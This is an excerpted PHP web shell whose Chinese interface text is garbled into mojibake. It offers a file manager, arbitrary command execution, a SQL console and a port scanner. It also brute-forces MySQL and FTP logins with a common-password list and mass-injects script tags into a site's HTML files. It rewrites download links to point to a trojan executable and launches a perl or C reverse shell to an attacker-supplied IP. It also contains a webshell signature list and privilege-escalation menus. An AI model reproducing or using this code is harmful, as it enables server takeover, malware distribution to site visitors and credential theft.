...
{
	if(($count = count($array)) == 0) return 'ѡļ';
	if($actall == 'e')
	{
		$zip = new packdir;
	...
	while($i < $count)
	{
		...
		switch($actall)
		{
			case "a" : $inver = urldecode($inver); if(!is_dir($inver)) return '·'; $filename = array_pop(explode('/',$array[$i])); @copy($array[$i],File_Str($inver.'/'.$filename)); $msg = ''; break;
			case "b" : if(!@unlink($array[$i])){@chmod($filename,0666);@unlink($array[$i]);} $msg = 'ɾ'; break;
			case "c" : if(!eregi("^[0-7]{4}$",$inver)) return 'ֵ'; $newmode = base_convert($inver,8,10); @chmod($array[$i],$newmode); $msg = '޸'; break;
			case "d" : @touch($array[$i],strtotime($inver)); $msg = '޸ʱ'; break;
		}
		$i++;
	}
	return 'ѡļ'.$msg.'';
...
function File_Soup($p)
{
	...
	$MSG_BOX = 'С:'.$UP_SIZE.', ʽ(new.php),Ϊ,򱣳ԭļ.';
		...
		if(count($_FILES['soup']) >= 1)
		{
			...
			foreach ($_FILES['soup']['error'] as $key => $error)
			{
				if ($error == UPLOAD_ERR_OK)
				{
					...
					$MSG_BOX .= File_Up($souptmp,File_Str($_POST['updir'].'/'.$soupname)) ? '<br>'.$soupname.'ϴɹ' : '<br>'.$soupname.'ϴʧ';
				}
				$i++;
			}
		}
...
<div class="actall">ϴĿ¼: <input type="text" name="updir" value="{$p}" style="width:531px;height:22px;"></div>
<div class="actall">1 <input type="file" name="soup[]" style="width:400px;height:22px;">  <input type="text" name="reup[]" style="width:130px;height:22px;"></div>
<div class="actall">2 <input type="file" name="soup[]" style="width:400px;height:22px;">  <input type="text" name="reup[]" style="width:130px;height:22px;"></div>
<div class="actall">3 <input type="file" name="soup[]" style="width:400px;height:22px;">  <input type="text" name="reup[]" style="width:130px;height:22px;"></div>
<div class="actall">4 <input type="file" name="soup[]" style="width:400px;height:22px;">  <input type="text" name="reup[]" style="width:130px;height:22px;"></div>
<div class="actall">5 <input type="file" name="soup[]" style="width:400px;height:22px;">  <input type="text" name="reup[]" style="width:130px;height:22px;"></div>
<div class="actall">6 <input type="file" name="soup[]" style="width:400px;height:22px;">  <input type="text" name="reup[]" style="width:130px;height:22px;"></div>
<div class="actall">7 <input type="file" name="soup[]" style="width:400px;height:22px;">  <input type="text" name="reup[]" style="width:130px;height:22px;"></div>
<div class="actall">8 <input type="file" name="soup[]" style="width:400px;height:22px;">  <input type="text" name="reup[]" style="width:130px;height:22px;"></div>
...
function File_a($p)
{
	...
	if(!empty($_POST['ufs'])){if($_POST['ufn'] != '') $upfilename = $_POST['ufn']; else $upfilename = $_FILES['ufp']['name'];$MSG_BOX = File_Up($_FILES['ufp']['tmp_name'],File_Str($p.'/'.$upfilename)) ? 'ϴļ '.$upfilename.' ɹ' : 'ϴļ '.$upfilename.' ʧ';}
	if(!empty($_POST['actall'])){$MSG_BOX = File_Act($_POST['files'],$_POST['actall'],$_POST['inver']);}
	if(!empty($_GET['mn'])){$MSG_BOX = @rename(File_Str($p.'/'.$_GET['mn']),File_Str($p.'/'.$_GET['rn'])) ? ' '.$_GET['mn'].' Ϊ '.$_GET['rn'].' ɹ' : ' '.$_GET['mn'].' Ϊ '.$_GET['rn'].' ʧ';}
	if(!empty($_GET['dn'])){$MSG_BOX = @mkdir(File_Str($p.'/'.$_GET['dn']),0777) ? 'Ŀ¼ '.$_GET['dn'].' ɹ' : 'Ŀ¼ '.$_GET['dn'].' ʧ';}
	if(!empty($_GET['dd'])){$MSG_BOX = File_Deltree($_GET['dd']) ? 'ɾĿ¼ '.$_GET['dd'].' ɹ' : 'ɾĿ¼ '.$_GET['dd'].' ʧ';}
	if(!empty($_GET['df'])){if(!File_Down($_GET['df'])) $MSG_BOX = 'ļ';}
	Root_CSS();
print<<<END
<script type="text/javascript">
	...
	<option>---Ŀ¼---</option>
	<option value="{$ROOT_DIR}"> վĿ¼ </option>
	...
	<input type="button" value="ϴ" onclick="window.location='?s=q&p={$p}';"> 
	<input type="file" name="ufp" style="width:300px;height:22px;">
	<input type="text" name="ufn" style="width:121px;height:22px;">
	<input type="submit" name="ufs" value="ϴ" style="width:50px;">
	</form>
	</div>
	<form method="POST" id="fileall" action="?s=a&p={$THIS_DIR}">
	<table border="0"><tr>
	<td class="toptd" style="width:480px;"> <a href="?s=a&p={$UP_DIR}"><b>ϼĿ¼</b></a> </td>
	<td class="toptd" style="width:75px;">  </td>
	<td class="toptd" style="width:45px;">  </td>
	<td class="toptd" style="width:165px;"> ޸ʱ </td>
	<td class="toptd" style="width:65px;"> С </td></tr>
END;
...
<input type="button" value="" onclick="SubmitUrl('ѡļ·: ','{$THIS_DIR}','a');return false;"> 
...
<input type="button" value="ʱ" onclick="CheckDate('2009-01-01 00:00:00','d');return false;"> 
<input type="button" value="" onclick="SubmitUrl('ѡļΪ: ','spider.tar.gz','e');return false;"> 
Ŀ¼({$NUM_D}) / ļ({$NUM_F})</div>
</form>
END;
	return true;
...
function Guama_b()
{
	if((!empty($_POST['gp'])) && (!empty($_POST['gt'])) && (!empty($_POST['gc'])))
	{
		...
		echo Guama_Auto($_POST['gp'],$gt,$gl,$_POST['gc'],$_POST['incode'],$gk,$gd,$gb,$go) ? '' : '쳣ֹ';
		echo '<br><input type="button" value="" onclick="history.back();">';
		return false;
	}
	$FILE_DIR = File_Str(dirname(__FILE__));
	$ROOT_DIR = File_Mode();
...
function autorun(){
	...
	if(document.getElementById('gt').value == ''){alert('ļͲΪ');return false;}
	if(document.getElementById('gc').value == ''){alert('벻Ϊ');return false;}
...
<option value="1">վĿ¼</option>
<option value="2">Ŀ¼</option>
</select></div>
<div class="actall" style="height:35px;">ļ <input type="text" name="gt" id="gt" value=".htm|.html|.shtml" style="width:500px;">
<select onchange='return Fulll(options[selectedIndex].value)'>
<option value="0" selected>--ѡ--</option>
<option value="3">̬ļ</option>
<option value="4">ű̬</option>
<option value="5">JSļ</option>
</select></div>
...
<input type="radio" name="inout" onclick="gl.disabled=false;"> <input type="radio" name="inout" onclick="gl.disabled=true;" checked>ر</div>
...
<div class="msgbox">˵: ԶѰ[-6-]ǩ,滻Ϊַ,6ʾλַ,12λ,οԲ[-6-]ǩ.
<br>ʾ: &lt;script language=javascript src="http://www.baidu.com/ad.js?EMTDSU"&gt;&lt;/script&gt;</div></div>
<div class="actall" style="height:35px;"><input type="radio" name="incode" value="1" checked>&lt;/head&gt;ǩ֮ǰ 
<input type="radio" name="incode" value="2">ļ 
<input type="radio" name="incode" value="3">ļĩβ</div>
<div class="actall" style="height:30px;"><input type="checkbox" name="gx" value="1" checked>ܹظ <input type="checkbox" name="gd" value="1" checked>ļ޸ʱ䲻</div>
<div class="actall" style="height:50px;"><input type="radio" name="gb" value="a" checked>Ӧڸļ,ļкļ
<br><input type="radio" name="gb" value="b">Ӧڸļ</div>
...
function Qingma_c()
{
	if((!empty($_POST['qp'])) && (!empty($_POST['qt'])) && (!empty($_POST['qc'])))
	{
		...
		echo Qingma_Auto($_POST['qp'],$qt,$_POST['qc'],$qd,$qb) ? '' : '쳣ֹ';
		echo '<br><input type="button" value="" onclick="history.back();">';
		return false;
	}
	$FILE_DIR = File_Str(dirname(__FILE__));
...
function autoup(){
	...
	if(document.getElementById('qt').value == ''){alert('ļͲΪ');return false;}
	if(document.getElementById('qc').value == ''){alert('벻Ϊ');return false;}
...
<div class="actall" style="height:35px;">ļ <input type="text" name="qt" id="qt" value=".htm|.html|.shtml" style="width:500px;">
<select onchange='return Fullll(options[selectedIndex].value)'>
<option value="0" selected>--ѡ--</option>
<option value="3">̬ļ</option>
...
<div class="actall" style="height:30px;"><input type="checkbox" name="qd" value="1" checked>ļ޸ʱ䲻</div>
<div class="actall" style="height:50px;"><input type="radio" name="qb" value="a" checked>Ӧڸļ,ļкļ
<br><input type="radio" name="qb" value="b">Ӧڸļ</div>
...
function Tihuan_d()
{
	if((!empty($_POST['tp'])) && (!empty($_POST['tt'])))
	{
		...
		echo Tihuan_Auto($_POST['tp'],$tt,$th,$_POST['tca'],$_POST['tcb'],$td,$tb) ? '滻' : '쳣ֹ';
		echo '<br><input type="button" value="" onclick="window.location=\'?s=d\'">';
		return false;
	}
	$FILE_DIR = File_Str(dirname(__FILE__));
	$ROOT_DIR = File_Mode();
...
function showth(th){
	if(th == 'a') document.getElementById('setauto').innerHTML = ' <textarea name="tca" id="tca" style="width:610px;height:100px;"></textarea><br>滻Ϊ <textarea name="tcb" id="tcb" style="width:610px;height:100px;"></textarea>';
	if(th == 'b') document.getElementById('setauto').innerHTML = '<br>غ׺ <input type="text" name="tca" id="tca" value=".exe|.z0|.rar|.zip|.gz|.torrent" style="width:500px;"><br><br>滻Ϊ <input type="text" name="tcb" id="tcb" value="http://www.baidu.com/download/muma.exe" style="width:500px;">';
	return true;
}
function autoup(){
	if(document.getElementById('tp').value == ''){alert('滻·Ϊ');return false;}
	if(document.getElementById('tt').value == ''){alert('ļͲΪ');return false;}
	if(document.getElementById('tca').value == '' || document.getElementById('tcb').value == ''){alert('滻벻Ϊ');return false;}
...
<div class="actall" style="height:235px;"><input type="radio" name="th" value="a" onclick="showth('a')" checked>滻ļеָ <input type="radio" name="th" value="b" onclick="showth('b')">滻ļеصַ<br>
<div id="setauto"> <textarea name="tca" id="tca" style="width:610px;height:100px;"></textarea><br>滻Ϊ <textarea name="tcb" id="tcb" style="width:610px;height:100px;"></textarea></div></div>
<div class="actall" style="height:30px;"><input type="checkbox" name="td" value="1" checked>ļ޸ʱ䲻</div>
<div class="actall" style="height:50px;"><input type="radio" name="tb" value="a" checked>滻Ӧڸļ,ļкļ
<br><input type="radio" name="tb" value="b">滻Ӧڸļ</div>
<div class="actall"><input type="button" value="ʼ滻" style="width:80px;height:26px;" onclick="autoup();"></div>
</form>
END;
	return true;
}
...
{
	if(!empty($_GET['df'])){echo $_GET['df'];if(@unlink($_GET['df'])){echo 'ɾɹ';}else{@chmod($_GET['df'],0666);echo @unlink($_GET['df']) ? 'ɾɹ' : 'ɾʧ';} return false;}
	...
	$features_php = array('php1'=>'cha88.cn','php2'=>'->read()','php3'=>'readdir(','ΣMYSQL4'=>'returns string soname','phpܴ5'=>'eval(gzinflate(','phpܴ6'=>'eval(base64_decode(','phpһ仰7'=>'eval($_','phpһ仰8'=>'eval ($_','phpϴ9'=>'copy($_FILES','phpϴ10'=>'copy ($_FILES','phpϴ11'=>'move_uploaded_file($_FILES','phpϴ12'=>'move_uploaded_file ($_FILES','phpС13'=>'str_replace(\'\\\\\',\'/\',');
	$features_asx = array('aspС1'=>'·','aspС2'=>'','aspС3'=>'fso.createtextfile(path,true)','aspһ仰4'=>'<%execute(request','aspһ仰5'=>'<%eval request','aspһ仰6'=>'execute session(','aspݿ7'=>'--Created!','asp8'=>'WScript.Shell','aspС9'=>'<%@ LANGUAGE = VBScript.Encode %>','aspx10'=>'www.rootkit.net.cn','aspx11'=>'Process.GetProcesses','aspx12'=>'lake2');
print<<<END
<div class="actall" style="height:100px;"><form method="POST" name="tform" id="tform" action="?s=e">
ɨ· <input type="text" name="sp" id="sp" value="{$SCAN_DIR}" style="width:400px;">
<select name="st">
<option value="php">phpľ</option>
<option value="asx">asp+aspxľ</option>
<option value="ppp">php+asp+aspxľ</option>
</select>
<input type="submit" value="ʼɨ" style="width:80px;">
</form><br>
END;
	if(!empty($_POST['sp']))
	{
		...
		echo Antivirus_Auto($_POST['sp'],$features_all,$st) ? 'ɨ' : '쳣ֹ';
	}
	echo '</div>';
	return true;
}
...
print<<<END
ִCMD<br> <input type="text" name="cmd" value="{$cmd}" style="width:600px;">
<input type="submit" value="ִ" style="width:80px;"></form><br>
END;
	if(!empty($_POST['cmd']))
	{
...
print<<<END
·<br><input type="text" name="run" value="{$run}" style="width:600px;">
<br><br><br><input type="text" name="cmd" value="{$cmd}" style="width:600px;">
<br><br><input type="submit" value="ִ" style="width:80px;"></form><br>
END;
	if(!empty($_POST['run'])) echo (@$shell->ShellExecute($run,'/c '.$cmd) == '0') ? 'ִгɹ' : 'ִʧ';
}
elseif($object == 'adodb')
{
...
ݿַ<br> <input type="text" name="string" id="string" value="{$string}" style="width:600px;">
...
<option value="11">ɾݱ</option>
<option value="12">ֶ</option>
<option value="13">ɾֶ</option>
</select>
<br><br>SQL<br> <input type="text" name="sql" id="sql" value="{$sql}" style="width:600px;">
...
END;
	if(!empty($string))
	{
		...
		echo $result ? $sql.' ִгɹ<br>' : $sql.' ִʧ<br>';
...
ɨIP<br><input type="text" name="ip" value="127.0.0.1" style="width:600px;">
<br><br>˿ں<br><input type="text" name="port" value="21|23|25|80|110|135|139|445|1433|3306|3389|43958" style="width:600px;">
<br><br> <input type="submit" value="ɨ" style="width:80px;">
</form><br>
END;
...
function Shellcode_j()
{
	...
	if(!empty($_POST['code']))
	{
		...
		if(!$Shell_Code) $Shell_Code = 'δҵshellcodeеصַ';
		$Shell_Code = htmlspecialchars($Shell_Code);
	}
print<<<END
<form method="POST" name="jform" id="jform" action="?s=j">
<div class="actall">ֵ<input name="number" value="{$Oday_value}" type="text" style="width:30px">&nbsp;&nbsp;&nbsp;
<input type="radio" name="xor" value="a"{$checkeda}>shellcode <input type="radio" name="xor" value="b"{$checkedb}>shellcode</div>
<div class="actall"><textarea name="code" rows="20" cols="90">{$Shell_Code}</textarea></div>
<div class="actall"><input type="submit" value="ת" style="width:80px;"></div>
</form>
END;
	return true;
}
...
function Crack_k()
{
	...
	if((!empty($_POST['address'])) && (!empty($_POST['user'])) && (!empty($_POST['pass'])))
	{
		...
		for($k = 0;$k < count($SORTPASS);$k++)
		{
			...
			if($connect) $MSG_BOX = '[Ŀ: '.$_POST['class'].'] [ַ: '.$_POST['address'].'] [û: '.$_POST['user'].'] [: '.$SORTPASS[$k].']';
		}
	}
print<<<END
<form method="POST" name="kform" id="kform" action="?s=k">
<div id="msgbox" class="msgbox">{$MSG_BOX}</div>
<div class="actall">ַ <input type="text" name="address" value="localhost" style="width:300px"></div>
<div class="actall">ʺ <input type="text" name="user" value="root" style="width:300px"></div>
<div class="actall"> <textarea name="pass" rows="10" cols="80">{$PASS}root,123456,123123,123321,admin,admin888,admin@admin,root@root,qwer123,5201314,iloveyou,fuckyou,kissme,520520,5845201314,a123456,a123456789</textarea></div>
<div class="actall">ƽĿ: <input type="radio" name="class" value="mysql" checked>Mysql 
<input type="radio" name="class" value="ftp">FTP</div>
<div class="actall"><input type="submit" value="ʼƽ" style="width:80px;"></div></form>
END;
	return true;
}
...
IP <input type="text" name="yourip" value="{$yourip}" style="width:200px">
Ķ˿ <input type="text" name="yourport" value="12345" style="width:200px">
ʹýű <select name="use" >
<option value="perl">perl</option>
<option value="c">c</option>
</select>
<input type="submit" value="ʼ" style="width:80px;"></form><br>
END;
	if((!empty($_POST['yourip'])) && (!empty($_POST['yourport'])))
	{
		if($_POST['use'] == 'perl')
		{
			...
			echo File_Write('/tmp/spider_bc',base64_decode($back_connect_pl),'wb') ? '/tmp/spider_bcɹ<br>' : '/tmp/spider_bcʧ<br>';
			$perlpath = Exec_Run('which perl');
			$perlpath = $perlpath ? chop($perlpath) : 'perl';
			echo Exec_Run($perlpath.' /tmp/spider_bc '.$_POST['yourip'].' '.$_POST['yourport'].' &') ? 'nc -l -n -v -p '.$_POST['yourport'] : 'ִʧ';
		}
		if($_POST['use'] == 'c')
		{
			...
			echo File_Write('/tmp/spider_bc.c',base64_decode($back_connect_c),'wb') ? '/tmp/spider_bc.cɹ<br>' : '/tmp/spider_bc.cʧ<br>';
			$res = Exec_Run('gcc -o /tmp/angel_bc /tmp/angel_bc.c');
			@unlink('/tmp/spider_bc.c');
			echo Exec_Run('/tmp/spider_bc '.$_POST['yourip'].' '.$_POST['yourport'].' &') ? 'nc -l -n -v -p '.$_POST['yourport'] : 'ִʧ';
		}
		echo '<br>ԳӶ˿ (nc -l -n -v -p '.$_POST['yourport'].')';
	}
	echo '</div>';
	return true;
}
...
ɼ· <input type="text" name="mpath" value="{$mpath}" style="width:400px"> 
...
<option value="5">鿴IP</option>
<option value="6">guestʻ</option>
...
<a href="?s=n&o=u">[MYSQLϴļ]</a> 
<a href="?s=n&o=d">[MYSQLļ]</a></div>
<div class="actall">
ַ <input type="text" name="mhost" value="{$mhost}" style="width:110px">
˿ <input type="text" name="mport" value="{$mport}" style="width:110px">
û <input type="text" name="muser" value="{$muser}" style="width:110px">
...
<html>
	...
	<head>
		<style type="text/css">
			*{padding:0; margin:0;}
			body{background:#AAAAAA;font-family:"Verdana", "Tahoma", "",sans-serif; font-size:13px;margin:0 auto; text-align:center;margin-top:5px;word-break:break-all;}
			...
			<div style="height:546px;">
				...
				<td width="140" align="center" valign="top">
					<ul class="listbg">
						...
						<li><a href="?s=e" id="t_4" onclick="switchTab('t_4')" target="main"> ľ </a></li>
						<li><a href="?s=f" id="t_5" onclick="switchTab('t_5')" target="main"> ϵͳϢ </a></li>
						...
						<li><a href="?s=j" id="t_9" onclick="switchTab('t_9')" target="main"> ת </a></li>
						<li><a href="?s=k" id="t_10" onclick="switchTab('t_10')" target="main"> ɨ </a></li>
						<li><a href="?s=l" id="t_11" onclick="switchTab('t_11')" target="main"> LinuxȨ </a></li>
						<li><a href="?s=m" id="t_12" onclick="switchTab('t_12')" target="main"> MYSQLȨ </a></li>
						...
						<li><a href="?s=logout" id="t_15" onclick="switchTab('t_15')"> ˳ϵͳ </a></li>
					</ul>
				</td>
				<td>
